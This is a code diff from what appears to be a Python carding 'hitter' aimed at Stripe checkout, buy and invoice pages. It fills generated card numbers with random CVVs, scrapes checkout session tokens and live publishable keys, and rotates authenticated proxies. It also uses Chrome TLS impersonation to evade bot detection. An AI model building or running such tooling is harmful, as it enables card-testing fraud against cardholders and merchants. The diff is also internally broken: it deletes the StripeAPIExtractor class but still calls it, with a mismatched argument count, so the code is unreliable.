@@ -951,38 +951,7 @@ class CardGenerator:
         cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
         return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}
 
-class StripeAPIExtractor:
-    @staticmethod
-    def extract_cs_live(url: str, html: str) -> Optional[str]:
-        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
-        for pattern in patterns:
-            match = re.search(pattern, url)
-            if match: return match.group(1) if '(' in pattern else match.group(0)
-        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
-        return match.group(0) if match else None
-    
-    @staticmethod
-    def extract_pk_live(html: str) -> Optional[str]:
-        match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
-        return match.group(0) if match else None
-        
-    @staticmethod
-    def is_invoice_page(url: str) -> bool:
-        return 'invoice.stripe.com' in url.lower()
-        
-    @staticmethod
-    async def extract_invoice_amount(page: Page) -> Optional[str]:
-        try:
-            return await page.evaluate('''() => {
-                const amountEl = document.querySelector('[data-testid="invoice-amount-due"], .AmountDue');
-                if (!amountEl) return null;
-                return amountEl.innerText;
-            }''')
-        except: return None
 
-    @staticmethod
-    async def fetch_payment_data(cs_token: str, pk_key: str) -> Dict:
-        pass
 
 # ============= AUTOFILL ENGINES =============
 class StripeV1_NormalForm(BaseAutofill):
@@ -1730,7 +1699,40 @@ class ConcurrentHitter:
         self.is_running = True
         
     async def analyze_first(self, browser):
-        max_retries = 1 # Fail fast
+        # 1% CODER: FAST PATH! Bypass Playwright completely for native Stripe endpoints using curl_cffi TLS impersonation
+        url_lower = self.url.lower()
+        if any(x in url_lower for x in ['checkout.stripe.com', 'buy.stripe.com', 'invoice.stripe.com']):
+            for _ in range(3):
+                try:
+                    proxy_data = await ProxyManager.get_random(self.user_id)
+                    proxies = None
+                    if proxy_data:
+                        auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
+                        proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                        proxies = {"http": proxy_url, "https": proxy_url}
+                    
+                    if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
+                    
+                    async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
+                        resp = await s.get(self.url, timeout=10)
+                        html = resp.text
+                        
+                        self.autofill_class = StripeV4_Invoice if 'invoice.stripe.com' in url_lower else StripeV2_ElementsIframe
+                        cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
+                        pk_key = StripeAPIExtractor.extract_pk_live(html)
+                        self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None}
+                        
+                        if cs_token and pk_key:
+                            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
+                            if api_data.get('success'):
+                                self.url_info['amount'] = api_data.get('amount')
+                                self.url_info['merchant'] = api_data.get('merchant')
+                        return # Fast path successful, abort Playwright analyzer
+                except Exception as e:
+                    continue # Try next proxy
+                    
+        # Fallback: Playwright analyzer for all other gateways
+        max_retries = 3 # Increased to 3 so a single bad proxy doesn't abort the session
         for attempt in range(max_retries):
             context = None
             try:
